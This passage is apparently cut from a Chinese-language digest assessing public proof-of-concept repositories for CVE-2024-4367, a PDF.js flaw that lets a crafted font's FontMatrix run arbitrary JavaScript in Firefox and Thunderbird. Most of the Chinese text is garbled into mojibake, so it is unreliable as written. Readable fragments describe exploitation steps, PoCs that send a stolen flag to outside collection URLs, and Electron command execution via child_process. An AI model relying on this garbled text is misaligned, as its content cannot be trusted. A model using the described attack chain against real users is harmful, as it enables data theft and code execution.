ã€‚å…¶ä½™çš„PDFç»“æ„ä»£ç æ˜¯æ¼æ´åˆ©ç”¨çš„å¿…è¦ç»„æˆéƒ¨åˆ†ï¼Œä¹Ÿæ²¡æœ‰å‘ç°éšè—çš„æ¶æ„ä»£ç æˆ–åé—¨ã€‚ å› æ­¤ï¼Œå¯ä»¥è®¤ä¸ºè¯¥ POC ä»£ç ä¸å­˜åœ¨æŠ•æ¯’é£é™©ã€‚\n\n**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**\n1.  **æ„é€ æ¶æ„ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ Type 1 å­—ä½“çš„ PDF æ–‡ä»¶ã€‚å…³é”®åœ¨äº `FontMatrix` å­—æ®µï¼Œæ”»å‡»è€…åœ¨è¯¥å­—æ®µä¸­æ’å…¥ JavaScript ä»£ç ã€‚\n2.  **è¯±å¯¼ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦è¯±ä½¿ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚\n3.  **æ‰§è¡Œ JavaScript ä»£ç ï¼š** å½“ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šè§£æè¯¥æ–‡ä»¶ã€‚åœ¨å¤„ç†åˆ°æ¶æ„ Type 1 å­—ä½“æ—¶ï¼Œ`FontMatrix` å­—æ®µä¸­çš„ JavaScript ä»£ç ä¼šè¢«æ‰§è¡Œã€‚\n4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´åï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨æˆ–é‚®ä»¶å®¢æˆ·ç«¯ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œä¾‹å¦‚çªƒå– Cookieã€è·å–æ•æ„Ÿä¿¡æ¯ï¼Œç”šè‡³æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚

**é¡¹ç›®åœ°å€:** [1337rokudenashi/Odoo_PDFjs_CVE-2024-4367.pdf](https://github.com/1337rokudenashi/Odoo_PDFjs_CVE-2024-4367.pdf)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #3

**æ¥æº**: [CVE-2024-4367-BektiHandoyo_cve-pdf-host.md](../2024/CVE-2024-4367-BektiHandoyo_cve-pdf-host.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€XSSæ”»å‡»å’Œè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­ï¼‰

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„æ„é€ çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ„é€ æ¶æ„PDFï¼š** æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡æ¡£ã€‚ ä»æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç  `exploit.pdf` å’Œ `poc.pdf` æ¥çœ‹ï¼Œæ”»å‡»è€…åœ¨PDFçš„å­—ä½“å¯¹è±¡ä¸­åµŒå…¥ JavaScript ä»£ç ã€‚ å…·ä½“æ¥è¯´ï¼Œä»£ç è¢«åµŒå…¥åˆ° `/Font` å¯¹è±¡çš„ `/FontMatrix` å±æ€§ä¸­ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ç»•è¿‡ç±»å‹æ£€æŸ¥ã€‚
2.  **è§¦å‘æ¼æ´ï¼š** å½“ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡æ¡£æ—¶ï¼ŒPDF.js ä¼šå°è¯•æ¸²æŸ“å­—ä½“ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„ JavaScript ä»£ç ã€‚
3.  **ä»£ç æ‰§è¡Œï¼š**  åµŒå…¥çš„ JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œã€‚ åœ¨æä¾›çš„ POC ä»£ç ä¸­ï¼Œæ¶æ„ JavaScript ä»£ç çš„ç›®çš„æ˜¯çªƒå–ä½äº `/app/admin/flag.pdf` çš„ flag æ–‡ä»¶ï¼Œå¹¶å°†å†…å®¹å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚
     *   `exploit.pdf`: å°† flag ä»¥ DataURL æ ¼å¼å‘é€åˆ° `https://ha.requestcatcher.com/`ã€‚
     *   `poc.pdf`:  å°† flag ä»¥æ–‡ä»¶æ ¼å¼å‘é€åˆ° `https://webhook.site/134021d3-88f1-44a6-aa82-e48e33247fcc`ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æ ¹æ®å¯¹æä¾›çš„ä¸¤ä¸ª PDF æ–‡ä»¶çš„åˆ†æï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚ ä¸¤ä¸ª PDF æ–‡ä»¶ä¸­çš„ JavaScript ä»£ç éƒ½æ—¨åœ¨åˆ©ç”¨æ¼æ´çªƒå– flagï¼Œå¹¶å°† flag æ•°æ®å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨è¿›è¡Œ exfiltrationã€‚ æ²¡æœ‰å‘ç°å…¶ä»–éšè—çš„æ¶æ„è¡Œä¸ºæˆ–åé—¨ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æä¾›çš„ POC ä»£ç åˆ©ç”¨äº† PDF.js åœ¨å­—ä½“å¤„ç†ä¸­ç±»å‹æ£€æŸ¥çš„ç¼ºå¤±æ¼æ´ã€‚ æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ­¤æ¼æ´å…è®¸æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ å› æ­¤ï¼ŒPOC ä»£ç **æœ‰æ•ˆ**ã€‚

**é¡¹ç›®åœ°å€:** [BektiHandoyo/cve-pdf-host](https://github.com/BektiHandoyo/cve-pdf-host)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #4

**æ¥æº**: [CVE-2024-4367-Bhavyakcwestern_Hacking-pdf.js-vulnerability.md](../2024/CVE-2024-4367-Bhavyakcwestern_Hacking-pdf.js-vulnerability.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js, Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** PDF.js < 4.2.67, Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„é«˜å±æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡ç‰¹åˆ¶çš„ PDF æ–‡ä»¶æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ `fontMatrix` æ•°ç»„ä¸­çš„æ¼æ´ï¼Œå°†æ¶æ„ä»£ç æ³¨å…¥åˆ° PDF æ–‡ä»¶ä¸­ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ PDF.js ç‰ˆæœ¬ï¼ˆå¦‚ Firefox 126 ä¹‹å‰çš„ç‰ˆæœ¬ï¼‰æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚è¿™å¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ï¼Œæˆ–è€…å¦‚æœ PDF.js è¿è¡Œåœ¨ Electron ç­‰ç¯å¢ƒä¸­ï¼Œç”šè‡³å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„POCä»£ç ï¼ˆ`ex1.pdf` å’Œ `ex-gist.pdf`ï¼‰é€šè¿‡æ„é€ æ¶æ„çš„`fontMatrix`æ•°æ®ï¼Œè¯æ˜äº†è¯¥æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚`ex1.pdf`è§¦å‘alertï¼Œ`ex-gist.pdf`ç”šè‡³å¯ä»¥ä»è¿œç¨‹åœ°å€åŠ è½½å¹¶æ‰§è¡ŒJavaScriptï¼ŒéªŒè¯äº†æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š** è™½ç„¶è¯¥é¡¹ç›®æä¾›äº†æ¼æ´åˆ©ç”¨çš„PoCï¼Œä½†æ˜¯æ£€æŸ¥äº†ä»“åº“ä¸­çš„å…¶ä»–æ–‡ä»¶ï¼Œå¦‚`astro.config.mjs`å’Œ`package-lock.json`ç­‰é…ç½®æ–‡ä»¶ï¼Œå¹¶æœªå‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ é£é™©ä¸»è¦å­˜åœ¨äºå¦‚æœä¸‹è½½è¯¥é¡¹ç›®å¹¶åœ¨å—ä¿¡ä»»çš„ç¯å¢ƒä¸­è¿è¡Œï¼Œè¿œç¨‹åŠ è½½çš„jsæ–‡ä»¶åŒ…å«æ¶æ„payloadçš„å¯èƒ½æ€§ï¼Œå› æ­¤æ¨æµ‹æŠ•æ¯’é£é™©è¾ƒä½ï¼Œé¢„ä¼°ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„å­—ä½“çš„PDFæ–‡ä»¶ï¼Œè¯¥å­—ä½“ä¸­åŒ…å«æ¶æ„çš„`fontMatrix`æ•°ç»„ã€‚
2.  `fontMatrix`æ•°ç»„çš„å…ƒç´ åŒ…å«JavaScriptä»£ç ã€‚
3.  å½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„PDF.jsç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsä¼šè§£æå­—ä½“æ•°æ®ï¼Œç”±äºç¼ºå°‘é€‚å½“çš„ç±»å‹æ£€æŸ¥ï¼Œä¼šå°†`fontMatrix`ä¸­çš„å­—ç¬¦ä¸²ä½œä¸ºJavaScriptä»£ç æ‰§è¡Œã€‚
4.  æ¶æ„JavaScriptä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨æˆ–Electronåº”ç”¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´XSSæˆ–RCEã€‚

**é¡¹ç›®åœ°å€:** [Bhavyakcwestern/Hacking-pdf.js-vulnerability](https://github.com/Bhavyakcwestern/Hacking-pdf.js-vulnerability)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #5

**æ¥æº**: [CVE-2024-4367-LOURC0D3_CVE-2024-4367-PoC.md](../2024/CVE-2024-4367-LOURC0D3_CVE-2024-4367-PoC.md)

## CVE-2024-4367 - PDF.js ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œè¿œç¨‹ä»£ç æ‰§è¡Œç­‰ã€‚

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚PDF.js å¿…é¡»é…ç½®ä¸º isEvalSupported=true (é»˜è®¤)

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œå³å¯è§¦å‘æ¼æ´ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚`CVE-2024-4367.py` è„šæœ¬ç”¨äºç”ŸæˆåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡ä»¶ã€‚ README.md æä¾›äº†ä½¿ç”¨ç¤ºä¾‹ï¼ŒåŒ…æ‹¬æ‰§è¡Œ `alert(document.domain)` ä»¥è¯æ˜ JavaScript ä»£ç æ‰§è¡Œï¼Œä»¥åŠåˆ©ç”¨ `require('child_process').exec()` æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ï¼ˆä»…åœ¨ Electron ç¯å¢ƒä¸‹ï¼‰ã€‚

**æŠ•æ¯’é£é™©ï¼š**
PoC ä»£ç æœ¬èº«æ˜¯ä¸ºäº†åˆ©ç”¨æ¼æ´ï¼Œè€Œä¸æ˜¯æ¤å…¥åé—¨ï¼Œå…¶ç›®çš„æ˜¯ç”ŸæˆåŒ…å«æ¶æ„ JavaScript çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æ—¨åœ¨åˆ©ç”¨ç›®æ ‡åº”ç”¨ç¨‹åºï¼ˆFirefox, Thunderbirdï¼‰ä¸­çš„æ¼æ´ã€‚ è¯¥ä»“åº“ä¸­æŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œå¤§çº¦ä¸º 5%ã€‚ ä¸»è¦çš„æ½œåœ¨é£é™©å¯èƒ½æ¥è‡ªï¼š

1.  **ä¾èµ–é¡¹æŠ•æ¯’:** è„šæœ¬æœ¬èº«å¾ˆç®€å•ï¼Œä¸ä¾èµ–äºå¤–éƒ¨åº“ã€‚å› æ­¤ï¼Œä¾èµ–é¡¹æŠ•æ¯’çš„é£é™©å¾ˆä½ã€‚
2.  **ä»£ç é€»è¾‘æ··æ·†:**  ä»£ç ç›¸å¯¹æ¸…æ™°ï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„é€»è¾‘æˆ–æ··æ·†ã€‚
3.  **ä¾›åº”é“¾æ”»å‡»:** ç”±äºè¯¥ PoC æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è„šæœ¬ï¼Œå¹¶æ²¡æœ‰å¤æ‚çš„æ„å»ºæˆ–åˆ†å‘è¿‡ç¨‹ï¼Œä¾›åº”é“¾æ”»å‡»çš„é£é™©ä¹Ÿè¾ƒä½ã€‚

ç„¶è€Œï¼Œåœ¨ä½¿ç”¨ä»»ä½•ç¬¬ä¸‰æ–¹æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ—¶ï¼Œéƒ½åº”ä¿æŒè°¨æ…ï¼Œä»”ç»†å®¡æŸ¥ä»£ç ï¼Œå¹¶åœ¨éš”ç¦»ç¯å¢ƒä¸­æµ‹è¯•ï¼Œä»¥é¿å…æ½œåœ¨çš„é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´ç‚¹ï¼š** PDF.js åœ¨å¤„ç†å­—ä½“æ—¶çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±ã€‚
2.  **æ”»å‡»å‘é‡ï¼š** æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨å­—ä½“å¤„ç†ä¸­çš„æ¼æ´åµŒå…¥æ¶æ„ JavaScript ä»£ç ã€‚
3.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   ä½¿ç”¨ `CVE-2024-4367.py` è„šæœ¬ç”Ÿæˆæ¶æ„çš„ `poc.pdf` æ–‡ä»¶ï¼ŒæŒ‡å®šè¦æ‰§è¡Œçš„ JavaScript ä»£ç ä½œä¸ºå‚æ•°ã€‚
    *   è¯±å¯¼å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ Firefox, Firefox ESR æˆ– Thunderbird æ‰“å¼€è¯¥ `poc.pdf` æ–‡ä»¶ã€‚
    *   å¦‚æœ PDF.js é…ç½®å…è®¸æ‰§è¡Œ JavaScript ä»£ç ï¼ˆé»˜è®¤æƒ…å†µä¸‹ `isEvalSupported` ä¸º trueï¼‰ï¼Œåˆ™åµŒå…¥åœ¨ PDF ä¸­çš„ JavaScript ä»£ç å°†åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯èƒ½å…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œä»è€Œå¯¼è‡´:
    *   åœ¨æµè§ˆå™¨ä¸Šä¸‹æ–‡ä¸­çªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼Œcookiesï¼Œä¼šè¯ä»¤ç‰Œï¼‰ã€‚
    *   è¿›è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚
    *   å¦‚æœ PDF.js è¿è¡Œåœ¨ Electron ç­‰ç¯å¢ƒä¸­ï¼Œå¯èƒ½æ‰§è¡Œä»»æ„æ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [LOURC0D3/CVE-2024-4367-PoC](https://github.com/LOURC0D3/CVE-2024-4367-PoC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #6

**æ¥æº**: [CVE-2024-4367-Masamuneee_CVE-2024-4367-Analysis.md](../2024/CVE-2024-4367-Masamuneee_CVE-2024-4367-Analysis.md)

## CVE-2024-4367: PDF.js ä»»æ„JavaScriptæ‰§è¡Œæ¼æ´

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´XSSæ”»å‡»ï¼Œçªƒå–ç”¨æˆ·æ•°æ®ï¼Œç”šè‡³è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºç¼ºå°‘å¯¹å­—ä½“å¤„ç†çš„ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„JavaScriptä»£ç ä¼šè¢«æ‰§è¡Œã€‚  

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**  æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚`README.md` æ–‡ä»¶æä¾›äº†æ¼æ´çš„æ¦‚è¿°ã€åˆ©ç”¨æ–¹æ³•ã€ç¼“è§£æªæ–½å’Œè¯¦ç»†åˆ†æçš„é“¾æ¥ã€‚`poc.py` è„šæœ¬ç”¨äºç”ŸæˆåŒ…å«æ¶æ„payloadçš„PDFæ–‡ä»¶ã€‚`app` ç›®å½•åŒ…å«ä¸€ä¸ªç®€å•çš„Node.jsåº”ç”¨ï¼Œç”¨äºæœ¬åœ°æµ‹è¯•ï¼Œå…è®¸ä¸Šä¼ PDFæ–‡ä»¶å¹¶é€šè¿‡`pdfjs-dist`åº“è¿›è¡Œæ¸²æŸ“ã€‚  `public/index.html` åŒ…å«å‰ç«¯ä»£ç ï¼Œç”¨äºä¸Šä¼ PDFå¹¶ä½¿ç”¨`pdf.js`è¿›è¡Œæ¸²æŸ“ã€‚  

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**  
*   æŸ¥çœ‹ `poc.pdf` ç¡®è®¤æ˜¯å¦æ¤å…¥åé—¨ï¼Œ`poc.pdf` æ˜¯æ¶æ„çš„PDFï¼Œ åˆ©ç”¨äº†å­—ä½“çš„è§£ææ¼æ´ï¼Œæ‰§è¡ŒJavascriptä»£ç ã€‚ ä½†æ˜¯ä¸å±äºåé—¨ï¼Œåªå±äºpocéªŒè¯çš„ä¸€éƒ¨åˆ†
*   æŸ¥çœ‹ `server.js` ä¸­é—´ä»¶æ˜¯å¦åŒ…å«æ¶æ„ä»£ç ï¼Œ`server.js` ä¸­é—´ä»¶å±äºæ­£å¸¸çš„expressä¸Šä¼ pdfå’Œæ‰“å¼€pdfçš„é€»è¾‘ã€‚
*   æŸ¥çœ‹ `public/index.html` ç¡®è®¤æ˜¯å¦è°ƒç”¨æ¶æ„apiï¼Œ `public/index.html`å±äºå‰ç«¯ä»£ç ï¼Œç”¨äºä¸Šä¼ pdfï¼Œå¹¶æ¸²æŸ“pdfï¼Œæ²¡æœ‰æ¶æ„apiè°ƒç”¨ã€‚
*   æŸ¥çœ‹ `poc.py` ç¡®è®¤æ˜¯å¦ç”Ÿæˆäº†æ¶æ„PDFï¼Œ`poc.py`å±äºpocéªŒè¯çš„ä¸€éƒ¨åˆ†
æ€»ä½“åˆ¤æ–­æŠ•æ¯’é£é™©æä½ï¼Œå¯èƒ½å­˜åœ¨çš„é£é™©æ˜¯ä¾èµ–åŒ…çš„ä¾›åº”é“¾æŠ•æ¯’é£é™©,è€ƒè™‘åˆ°node_modulesä½“ç§¯å·¨å¤§ï¼Œäººå·¥å®¡è®¡æˆæœ¬å¤ªé«˜ï¼Œæ‰€ä»¥è®¤ä¸ºå­˜åœ¨ 1% çš„æ½œåœ¨æŠ•æ¯’é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**
1.  æ”»å‡»è€…ä½¿ç”¨ `poc.py` è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…é€šè¿‡å„ç§æ‰‹æ®µï¼ˆä¾‹å¦‚ï¼Œç”µå­é‚®ä»¶ã€ç½‘ç«™é“¾æ¥ï¼‰è¯±ä½¿ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ã€‚
3.  å¦‚æœç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶ï¼ŒPDF.jsä¼šè§£æè¯¥æ–‡ä»¶ã€‚
4.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„çš„JavaScriptä»£ç ä¼šåœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œä»è€Œå®ç°XSSæ”»å‡»æˆ–æ½œåœ¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰§è¡Œçš„JavaScriptä»£ç çªƒå–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ã€ä¿®æ”¹ç½‘é¡µå†…å®¹ï¼Œç”šè‡³æ§åˆ¶ç”¨æˆ·çš„è®¡ç®—æœºã€‚

**é¡¹ç›®åœ°å€:** [Masamuneee/CVE-2024-4367-Analysis](https://github.com/Masamuneee/CVE-2024-4367-Analysis)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #7

**æ¥æº**: [CVE-2024-4367-MihranGIT_POC_CVE-2024-4367.md](../2024/CVE-2024-4367-MihranGIT_POC_CVE-2024-4367.md)

## CVE-2024-4367 - Firefox/Thunderbird PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** ä¸­å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶ï¼Œå¹¶ä¸”PDF.jsé…ç½®ä¸­`isEvalSupported`è®¾ç½®ä¸º`true` (é»˜è®¤å€¼)

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxã€Firefox ESR å’Œ Thunderbird ä¸­ PDF.js ç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è¯¥æ¼æ´æ˜¯ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥å¯¼è‡´çš„ã€‚

**æœ‰æ•ˆæ€§ï¼š**

